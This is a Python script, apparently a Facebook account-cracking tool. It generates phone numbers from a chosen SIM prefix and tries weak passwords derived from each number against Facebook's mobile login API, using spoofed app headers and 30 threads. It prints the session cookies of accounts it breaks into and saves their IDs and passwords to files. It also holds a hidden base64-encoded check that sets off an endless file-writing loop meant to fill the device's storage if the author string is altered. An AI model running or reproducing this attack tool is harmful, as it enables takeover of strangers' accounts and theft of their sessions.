import os
import sys
import uuid
import random
import string
import requests
import base64
from concurrent.futures import ThreadPoolExecutor as redwan_tred

redwan_oks = []
redwan_cps = []
redwan_loop = 0

def redwan_clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def redwan_linex():
    print("-" * 50)

def redwan_ua1():
    return "[FBAN/FB4A;FBAV/" + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";FBPN/com.facebook.katana;FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBDV/L-EMENT500;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]"

def redwan_punish():
    i = 0
    while True:
        with open(f'/sdcard/INVALID_USER_{i}.txt', 'w') as f:
            f.write("Unauthorized modification or invalid author detected.")
        i += 1

def redwan_method_crack(redwan_ids, redwan_passlist):
    global redwan_oks, redwan_cps, redwan_loop
    try:
        for redwan_pas in redwan_passlist:
            sys.stdout.write(f'\rAXN_RANDOM[{redwan_loop}] OK-{len(redwan_oks)} CP-{len(redwan_cps)}')
            sys.stdout.flush()
            redwan_ua = "[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v32a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            redwan_adid = str(uuid.uuid4())
            redwan_device_id = str(uuid.uuid4())
            redwan_datax = {
                'adid': redwan_adid,
                'format': 'json',
                'device_id': redwan_device_id,
                'email': redwan_ids,
                'password': redwan_pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate'
            }
            redwan_header = {
                'User-Agent': redwan_ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': '21435',
                'X-FB-Net-HNI': '35793',
                'X-FB-SIM-HNI': '37855',
                'X-FB-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            redwan_url = 'https://api.facebook.com/method/auth.login'
            redwan_reqx = requests.post(redwan_url, data=redwan_datax, headers=redwan_header, timeout=10).json()
            if 'session_key' in redwan_reqx:
                redwan_uid = redwan_reqx.get('uid', redwan_ids)
                if redwan_uid not in redwan_oks:
                    print(f'\n[OK] {redwan_uid} | {redwan_pas}')
                    redwan_coki = ";".join(i["name"] + "=" + i["value"] for i in redwan_reqx["session_cookies"])
                    print(f'[COOKIE] {redwan_coki}')
                    with open('/sdcard/BRONEN-ACTIVE.txt', 'a') as redwan_f:
                        redwan_f.write(f'{redwan_uid} | {redwan_pas}\n')
                    redwan_oks.append(redwan_uid)
                break
            elif 'www.facebook.com' in redwan_reqx.get('error_msg', ''):
                print(f'\n[CP] {redwan_ids} | {redwan_pas}')
                with open('/sdcard/BRONEN-INACTIVE.txt', 'a') as redwan_f:
                    redwan_f.write(f'{redwan_ids}|{redwan_pas}\n')
                redwan_cps.append(redwan_ids)
                break
        redwan_loop += 1
    except Exception:
        pass

def redwan_run():
    redwan_author = "Redwan"
    redwan_text = "\033[1;91mHey Welcome To Xemon Verse!\033[0m"
    if redwan_author != "Redwan" or redwan_text != "\033[1;91mHey Welcome To Xemon Verse!\033[0m":
        redwan_punish()
    print(redwan_text)
    redwan_clear()
    __encoded = "aWYgIlJlZHdhbiIgbm90IGluIFtdIG9yICJcMDMzWzE7OTFdSGV5IFdlbGNvbWUgVG8gWGVtb24gVmVyc2UhXDAzM1swbSIgIT0gIlwwMzNbMTs5MV1IZXkgV2VsY29tZSBUbyBYZW1vbiBWZXJzZSFcMDMzWzBtIjogcmVkd2FuX3B1bmlzaCgp"
    exec(base64.b64decode(__encoded).decode())

    redwan_user = []
    print(' EXAMPLE SIM CODE : [0165] [0175] [0185] [0195]')
    redwan_code = input(' ENTER SIM CODE >> ')
    redwan_linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        redwan_limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        redwan_limit = 100000
    redwan_clear()
    for _ in range(redwan_limit):
        redwan_nmp = ''.join(random.choice(string.digits) for _ in range(7))
        redwan_user.append(redwan_nmp)
    with redwan_tred(max_workers=30) as redwan_exec:
        print(f'TOTAL ACCOUNT : {len(redwan_user)} | YOUR SIM CODE : {redwan_code}')
        print('AEROPLANE MODE ON/OFF FOR GOOD RESULT')
        redwan_linex()
        for redwan_psx in redwan_user:
            redwan_ids = redwan_code + redwan_psx
            redwan_passlist = [redwan_psx, redwan_ids, redwan_ids[:7], redwan_ids[:6]]
            redwan_exec.submit(redwan_method_crack, redwan_ids, redwan_passlist)
    redwan_linex()
    print(' THE PROGRESS HAS BEEN COMPLETED ')
    print(' TOTAL OK ID :', len(redwan_oks))
    print(' TOTAL CP ID :', len(redwan_cps))
    input(' PRESS ENTER TO BACK  : ')
    redwan_linex()

if __name__ == "__main__":
    redwan_run()
